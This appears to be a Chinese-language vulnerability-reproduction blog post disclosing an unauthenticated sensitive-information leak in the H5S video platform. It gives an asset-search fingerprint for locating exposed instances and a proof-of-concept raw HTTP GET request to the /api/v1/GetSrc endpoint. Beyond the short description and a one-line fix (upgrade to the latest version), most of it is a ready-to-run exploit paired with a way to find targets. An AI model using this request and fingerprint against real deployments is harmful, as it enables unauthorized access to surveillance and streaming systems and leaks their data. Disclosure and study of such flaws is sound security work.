#  H5S视频平台敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-04 01:52  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# H5S视频平台敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2ngajCjQFibMTQUMJZSRhJrZdG7OqlMMMgMZd7nyMSlXEDP9vOLORqRiauhD8aNfC2vgmry2p8KmibbIH3K2yQoXhFy4sXAKgy20/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
H5S视频平台是零  
视技术（上海）有限公司研发的视频管理平台，支持跨平台视频播  
放与管理，具备低延迟  
、加密传输、集群级联等功能，适用于监控、直播等场景。  
攻击者可利用该漏洞访问后台相应端口，执行未授权操作，可能导致系统信息泄露、数据篡改等安全风险。  
  
04  
  
—  
  
资产测绘  
```
"H5S视频平台"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS3IicJtznHu1bdyPTwZywiaY5h2U0IpMs9H1gTeGJ4nqkibryq3AL4Z05icK6UNoib1vv1YQnoqyYibMTD7p0ZEeLp4xicHHnVkT2p02I/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /api/v1/GetSrc HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=mge2krjj3v8sbm97lkv4cfj2n6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2ZdxVibNicKF0QCTicSJkmZuUULpq0nBdTSlKbffn2GcXdwicL75NV2YIKj7KzVAG4dJVicfR5WjJ5g0YTkfLvUgXh4VgpV5Iqdgow/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1GnGuu5BZrrDW9ZmfoWGbEUh2kklM6XibxDlXqCjxBlhEGS1jr6og8buLe0vgzPa2JH71l43t2ZTtBogDP6l6TiaZ9ypUlt0ZSo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2k3Xibib9yyo27vApneF32ibd1Mu0MiaoiaicTK2eqx0vQcXyQQvFCfUoj0Waia3L5jWlVtiaghG6C7OYQzGKukhvmmcU0TcS7SNZibv18/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
